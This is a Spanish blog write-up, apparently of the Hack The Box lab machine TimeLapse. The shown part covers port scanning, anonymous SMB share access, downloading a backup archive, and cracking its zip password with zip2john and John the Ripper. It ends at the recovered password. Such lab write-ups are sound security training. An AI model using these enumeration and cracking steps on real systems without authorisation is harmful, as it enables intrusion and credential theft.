<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="WriteUp TimeLapse HTB" /><meta name="author" content="rabb1t" /><meta property="og:locale" content="es_ES" /><meta name="description" content="Índice Información básica de la máquina Herramientas y recursos empleados Enumeración SMB Crackeando contraseñas Obteniendo acceso como legacyy Obteniendo credenciales mediante LAPS Obteniendo sesión como Administrator" /><meta property="og:description" content="Índice Información básica de la máquina Herramientas y recursos empleados Enumeración SMB Crackeando contraseñas Obteniendo acceso como legacyy Obteniendo credenciales mediante LAPS Obteniendo sesión como Administrator" /><link rel="canonical" href="https://rabb1t-0.github.io/posts/WriteUp-TimeLapse-HTB/" /><meta property="og:url" content="https://rabb1t-0.github.io/posts/WriteUp-TimeLapse-HTB/" /><meta property="og:site_name" content="rabb1t" /><meta property="og:image" content="https://www.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png" /><meta property="og:image:height" content="180" /><meta property="og:image:width" content="180" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-20T00:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://www.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png" /><meta property="twitter:title" content="WriteUp TimeLapse HTB" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"rabb1t"},"dateModified":"2024-08-03T17:28:44-05:00","datePublished":"2022-08-20T00:00:00-05:00","description":"Índice Información básica de la máquina Herramientas y recursos empleados Enumeración SMB Crackeando contraseñas Obteniendo acceso como legacyy Obteniendo credenciales mediante LAPS Obteniendo sesión como Administrator","headline":"WriteUp TimeLapse HTB","image":{"width":180,"height":180,"url":"https://www.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rabb1t-0.github.io/posts/WriteUp-TimeLapse-HTB/"},"url":"https://rabb1t-0.github.io/posts/WriteUp-TimeLapse-HTB/"}</script><title>WriteUp TimeLapse HTB | rabb1t</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/rbit.jpg"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/rbit.jpg"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/favicon/rbit.ico"><meta name="apple-mobile-web-app-title" content="rabb1t"><meta name="application-name" content="rabb1t"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto glitch"><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div><div class="glitch__item"></div></a></div><div class="site-title mt-3"> <a href="/">rabb1t</a></div><div class="site-subtitle font-italic">Blog personal, CTFS, artículos de ciberseguridad y más.</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog" class="nav-link cybr-btn"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> INICIO <span class='cybr-btn__glitch' aria-hidden=''>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> CATEGORÍAS <span aria-hidden class="cybr-btn__glitch">CATEGORÍAS </span> </a><li class="nav-item"> <a href="/tags/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> ETIQUETAS <span aria-hidden class="cybr-btn__glitch">ETIQUETAS </span> </a><li class="nav-item"> <a href="/archives/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> ARCHIVO <span aria-hidden class="cybr-btn__glitch">ARCHIVO </span> </a><li class="nav-item"> <a href="/about/" class="nav-link cybr-btn"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> ACERCA DE <span aria-hidden class="cybr-btn__glitch">ACERCA DE </span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/rabb1t-0 " aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/rabb1t" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog"> Inicio </a> </span> <span>WriteUp TimeLapse HTB</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 180 180'%3E%3C/svg%3E" data-src="https://www.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png" class="preview-img bg" alt="Preview Image" width="180" height="180" data-proofer-ignore><h1 data-toc-skip>WriteUp TimeLapse HTB</h1><div class="post-meta text-muted"><div> Por <em> rabb1t </em></div><div class="d-flex"><div> <span> Publicado <em class="timeago" data-ts="1660971600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-08-20 </em> </span> <span> Actualizado <em class="timeago" data-ts="1722724124" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-08-03 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1839 palabras"> <em>10 min</em> de lectura</span></div></div></div><div class="post-content"><h2 id="índice"><span class="mr-2">Índice</span><a href="#índice" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="#máquina-timelapse">Información básica de la máquina</a><li><a href="#herramientas-y-recursos-empleados">Herramientas y recursos empleados</a><li><a href="#enumeración">Enumeración</a><ul><li><a href="#smb">SMB</a></ul><li><a href="#crackeando-contraseñas">Crackeando contraseñas</a><li><a href="#obteniendo-acceso-como-legacyy">Obteniendo acceso como legacyy</a><li><a href="#obteniendo-credenciales-mediante-laps">Obteniendo credenciales mediante LAPS</a><li><a href="#obteniendo-sesión-como-administrator">Obteniendo sesión como Administrator</a></ul><h2 id="máquina-timelapse"><span class="mr-2">Máquina TimeLapse</span><a href="#máquina-timelapse" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="table-wrapper"><table><thead><tr><th>IP<th>10.10.11.152<tbody><tr><td>OS<td>Windows<tr><td>Dificultad<td>Fácil<tr><td>Creador<td>ctrlzero</table></div><h2 id="herramientas-y-recursos-empleados"><span class="mr-2">Herramientas y recursos empleados</span><a href="#herramientas-y-recursos-empleados" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li>Herramientas<ul><li>Obtención de información:<ul><li>nmap<li>smbclient</ul><li>Comprimir y descomprimir:<ul><li>7z<li>unzip</ul><li>Crackeadores y generadores de hashes:<ul><li>zip2john<li>pfx2john<li>john<li>crackpkc12</ul><li>Otros:<ul><li>openssl<li>evil-winrm<li>crackmapexec</ul></ul></ul><h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Iniciemos con un escaneo de todos los puertos abiertos y la detección de servicios para los mismos:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-vvv</span> <span class="nt">-oN</span> scope.txt 10.10.11.152
Nmap scan report <span class="k">for </span>10.10.11.152
Host is up, received user-set <span class="o">(</span>0.39s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65527 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  tcpwrapped        syn-ack ttl 127
445/tcp   open  tcpwrapped        syn-ack ttl 127
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  tcpwrapped        syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
57854/tcp open  tcpwrapped        syn-ack ttl 127
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2022-08-19T04:32:07
|_  start_date: N/A
| p2p-conficker: 
|   Checking <span class="k">for </span>Conficker.C or higher...
|   Check 1 <span class="o">(</span>port 64147/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 2 <span class="o">(</span>port 32357/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 3 <span class="o">(</span>port 16288/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 4 <span class="o">(</span>port 22941/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/
</pre></table></code></div></div><h3 id="smb"><span class="mr-2">SMB</span><a href="#smb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Vemos el puerto empleado para SMB (Server Message Block) el cual es 445. Podemos intentar conectarnos para ver si hay recursos compartidos que nos pueda servir para comenzar:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>❯ smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> //10.10.11.152   
	Sharename       Type      Comment
	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
	C<span class="nv">$ </span>             Disk      Default share
	IPC<span class="nv">$ </span>           IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
</pre></table></code></div></div><p>Hay un recurso compartido que llama mucho la atención, <code class="language-plaintext highlighter-rouge">Shares</code>. Veamos qué nos encontramos ahí y qué nos puede servir:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>❯ smbclient <span class="nt">--no-pass</span> //10.10.11.152/Shares   
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Mon Oct 25 15:39:15 2021
  ..                                  D        0  Mon Oct 25 15:39:15 2021
  Dev                                 D        0  Mon Oct 25 19:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 15:48:42 2021

		6367231 blocks of size 4096. 2455284 blocks available
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Dev
smb: <span class="se">\D</span>ev<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Mon Oct 25 19:40:06 2021
  ..                                  D        0  Mon Oct 25 19:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021

		6367231 blocks of size 4096. 2455284 blocks available
smb: <span class="se">\D</span>ev<span class="se">\&gt;</span> <span class="nb">cd</span> ..
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>HelpDesk
smb: <span class="se">\H</span>elpDesk<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Mon Oct 25 15:48:42 2021
  ..                                  D        0  Mon Oct 25 15:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 14:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 14:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 14:57:40 2021
  LAPS_TechnicalSpecification.docx    A    72683  Mon Oct 25 14:57:44 2021

		6367231 blocks of size 4096. 2455284 blocks available
smb: <span class="se">\H</span>elpDesk<span class="se">\&gt;</span> <span class="nb">cd</span> ../Dev
smb: <span class="se">\D</span>ev<span class="se">\&gt;</span> get winrm_backup.zip 
getting file <span class="se">\D</span>ev<span class="se">\w</span>inrm_backup.zip of size 2611 as winrm_backup.zip <span class="o">(</span>2,0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 2,0 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\D</span>ev<span class="se">\&gt;</span> 
</pre></table></code></div></div><p>En el directorio <code class="language-plaintext highlighter-rouge">Dev</code> tenemos un backup, se ve jugoso de primeras porque puede tener contraseñas o información importante. En el directorio <code class="language-plaintext highlighter-rouge">HelpDesk</code> encontramos diversos documentos que de momento no veremos. Al final descargamos el archivo <code class="language-plaintext highlighter-rouge">winrm_backup.zip</code> a nuestra máquina con el comando <code class="language-plaintext highlighter-rouge">get</code>. Al salir de la sesión de smb, con <code class="language-plaintext highlighter-rouge">7z</code> listamos los archivos que tiene el comprimido:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>❯ 7z l winrm_backup.zip

7-Zip <span class="o">[</span>64] 17.04 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2021 Igor Pavlov : 2017-08-28
p7zip Version 17.04 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>es_CO.UTF-8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,2 CPUs x64<span class="o">)</span>

Scanning the drive <span class="k">for </span>archives:
1 file, 2611 bytes <span class="o">(</span>3 KiB<span class="o">)</span>

Listing archive: winrm_backup.zip

<span class="nt">--</span>
Path <span class="o">=</span> winrm_backup.zip
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 2611

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2021-10-25 14:21:20 .....         2555         2405  legacyy_dev_auth.pfx
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2021-10-25 14:21:20               2555         2405  1 files
</pre></table></code></div></div><p>Intentamos descomprimirlo con <em>unzip</em> pero nos pide contraseña:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>❯ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
<span class="o">[</span>winrm_backup.zip] legacyy_dev_auth.pfx password:
</pre></table></code></div></div><h2 id="crackeando-contraseñas"><span class="mr-2">Crackeando contraseñas</span><a href="#crackeando-contraseñas" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Con <code class="language-plaintext highlighter-rouge">zip2john</code> podemos crear un hash equivalente al archivo y guardarlo, para posteriormente crackearlo con <code class="language-plaintext highlighter-rouge">JtR</code> (John the Ripper) y obtener la contraseña (en caso de que se encuentre en el diccionario):</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>❯ zip2john winrm_backup.zip <span class="o">&gt;</span> hash_winrm_backup
winrm_backup.zip/legacyy_dev_auth.pfx:<span class="nv">$pkzip2$1</span><span class="k">*</span>2<span class="k">*</span>2<span class="k">*</span>0<span class="k">*</span>965<span class="k">*</span>9fb<span class="k">*</span>12ec5683<span class="k">*</span>0<span class="k">*</span>4e<span class="k">*</span>8<span class="k">*</span>965<span class="k">*</span>12ec<span class="k">*</span>72aa<span class="k">*</span>1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f936ce33ac06419899194de4b54c9258cd7a4a7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7e93fbcbe8a476f4c0e57db890a78a5f61d1ec1c9a7b28b98a81ba94a7b3a600498745859445ddaef51a982ae22577a385700fdf73c99993695b8ffce0ef90633e3d18bf17b357df58ea7f3d79f22a790606b69aed500db976ae87081c68d60aca373ad25ddc69bc27ddd3986f4d9ce77c4e49777c67a0740d2b4bbca38b4c2b3ee329ac7cf30e5af07f13d860a072784e753a999f3dd0d2c3bbb2269eeffe2f0b741441538e429cb9e8beee2999557332ac447393db6ed35856bd7fcae85329b99b21449f3bb63c9fb74870dbf76e7dc76859392bf913da2864555b6ed2a384a2ae8a6c462e5115adbf385f073cfc64ec7a4646386cf72b5529bbf48af050640f26c26e337add96b61aee56d3d92de09f25c40efe56d4c2b853ce29de32c05634afc4dc9ca8df991b73e10db5bb9cd3fc807bfe05bb789a4b4a525001d253ca6f67abc928ebe7777a0b2d06d7fd2d61123c7e6b8050fe51994f116bc9e694cbdd6e81bfe71672582e7329cb78e20793b970407ea0bb8787c93875be25432987b2fb385c08e1970e5f8868db466476ef41b157eaf4d9a69508d57166213d81f1f981cffd5a6d2053a65c380ad98f10eb2b94104cd41104c59e6f4d782868f38ae64c7b0c29fb0e05d18429c26dc3f5a9c4ec9328b0aff3a41679f9f12e9b4e2cc9dfca5a67c021a093549863923422ada4ccf082924ef1ec4ec38847bf2bffb893f14abecdad3c83a31e276a23542ff08cdc7d7ec6576dbda1edf1326174b13c7f078d6ea4dc90a743cdf6aa076a17250ac2fff6de8113ffc58dd4ccda187b6c7890264f0d0ff113aa3fa15b8515d0857f8110b99fa2915f0476a08b107965fa5e74c05018db0d9a8ecc893780027b58225e091b50aa07684f1990508275d87fd7a8f28193ca41d9ce649e3de4885913b15f318e7459c443849a248463bbfe949def6d9ca95e6ace6613eabf758c6399639f1f7779fc9aeee32d518a0db9a046340e002445b8ae9a5cb630a194a490d326247f3582680814dfed79496475e4a06f11d4433b13ed3c3803e3c1da5335cd7919453ce0a6b62116c0ffa0fc7c4bba77bbba080092541697c3200edc7e9aa001a01fc0063b27159384538ecb7cddab32a6feca01853ac712a0e21a436d647d1c94bd0a5b40510cb080d4ce79a2e49fc82fd961106b7b73d2e24603711300ddc711b8cc284cc284777d230ebcc140ab0296676f465da1afeb40fe2f4f9636238c09a9716a1f3071fd2653b9956c9180270b1582074175570d5784af0d22460e6d28153f146d01ff0f2388894b0541a9df950e1515a2397360e09c6dfd92feaf068f560be034bcf26cabc76be09a94254bbbf88f4ee85241c12be370ca32cc5391e33f05a2e7a75afe7876a893fdc9fded2ea1ac701001cf0d34eaba84dd4815a28dc4cfe6c3abc35a057f6b95dd4fdb07a99edc0a020273f5eb9b2d2e6686deda3c1c9c5deb85b9192d68a841cd9a7aa448ddd66e0a839d81f0106a8a1e38f6da99a3b973a0598aca2ba36cf9ef0b4a9da6ae327069a88677b7e5303a08cea1a37f2623d98233672e425693e16ade5b16d49669e2002aec50aedeccc21af37901d278bd3a5b7618b9f0332a4848a29e9e3eccef234cf2392d46c33be6c3c75e57f6c19998febadf2c6a3e22a6e4276e6863f8d16ecec1f4eca9495a031e5f7426bf90a9831b9901588e72330fc42fe3ed7a09d7404a14727b7b876786b35873cf24deb921662c458d05b8c8872d88e8889407024e46d06d8f3cf9a1d144deb91acf2273c13600bc2bbc9c1405269c3eff0042d0533c95f45c28ed2b8854fbbda941b1957d27122d8a6afe09261f206ccde7e7c4f69c8d46d4e101849c02c9eecc65e365ebf48e3ce836385dcfd824e085b0104b1210b5acfedb3df857cdc2ad9976660dfb20b228ce127c4cdc5bb9d89f65822ebd728b2d1dbce2872e9fa113c19ed251e7c103022b5029b63e35bcd0ef75bf13f1bb56499f1505b6eef27aa6fd079f4d4156c566a76d8b6bcdd518cdd6ea3de2048f9b059e338946fa2549ab27646ba9bfe08580df4582be056dcc68232efef533ea90c9c8d613e22fd4f2d75c6a89e4643ff3717a21dc0624a1c844549fc9700d137865b018eef82803ec1b3f19f9e3f25c276062effb0829c00825677d21530b14a8ee27c6507ff31549430f66488f4ef996cf784f37bbf103e49f17bef1ae41e02dce2a3715127942fcaec5da410f04174664b7eb0788e83920ad9afa223a5a4791bb28b3d5e75933edfd7535aaeb984f8dc1c5e3880411c733f775c93b620f14662c1594c909eceb7c8c25807b9e49771847a567d6fd63c607c6ebf71714a869cd4eb7956995cb7011c7973c705ee13aeabc319ff6f71569c9c46821cda0db6555dde9939f27f68d1b6dfcfb53b0ed1c9f35c7d29e550437ab80da87384614f9508dbb49f8be5a85c1bfebe13067aff3fd745009db52a4de15761f67ad2a3bf89440d134ed7c6c96c41340c6947785b75698e6b61a0d2da6ffe4290a15a932d42d5e2c4928a92121b0cb3c11a7bbb5fa5a70e31f7bd24e892466e767c4193f5902eb4fc22d1b9c9e7dc8f27886ca3a37dbd842a9fb445adaa738cddbc4e0b62c14b49dc807843db29df781a65491ae52dc16b5d5dc2193f965a595cd72c5b6f1e63e1b4b521e9d891b481fef699fb2ccb853df7b8a902910b229db859d293628baf30891c255fa46d337336fb0b4a47986939372f13f4315c38af852e9a8893fe275be0e5b095c1219edc026c71236ff3a314084383ad0228f26b7935f454c8d3d59306a2c7eb7f9220a67e8c1a2f508760f3ccdb52399e81bcb7e5347c1083ecbdb1c009338e017721b4324a40329a5938ab4ee99d087a2edb62d687fcebeda2211760b2287ff574ebc66e076132cab4cb15e1e551acf11f3ed87970aee89159421facc8eb82bca90a36c43f75df5bececfde3128e2834c5ecd067e61c9ba954cc54fc291a1458bdfe9f49fba35eb944625a528fb9d474aaa761314740997e4d2ed3b1cb8e86744cfb6c9d5e3d758684ff3d9fdc1ba45b39141625d4e6ba38cd3300507555935db1193b765d226c463481388a73d5361e57b7b40c7d3df38fc5da2c1a255ff8c9e344761a397d2c2d59d722723d27140c6830563ee783156404a17e2f7b7e506452f76<span class="k">*</span><span class="nv">$/</span>pkzip2<span class="nv">$:</span>legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
</pre></table></code></div></div><p>Ya tenemos el <code class="language-plaintext highlighter-rouge">hash</code>. Es momento de crackearlo con <code class="language-plaintext highlighter-rouge">John the Ripper</code>, para ello empleamos el diccionario <code class="language-plaintext highlighter-rouge">rockyou.txt</code> que tiene alrededor de 14 millones de posibles contraseñas:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>❯ john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="nb">hash            
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s2">"q"</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
supremelegacy    <span class="o">(</span>winrm_backup.zip/legacyy_dev_auth.pfx<span class="o">)</span>
surfrox1391..supervier
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
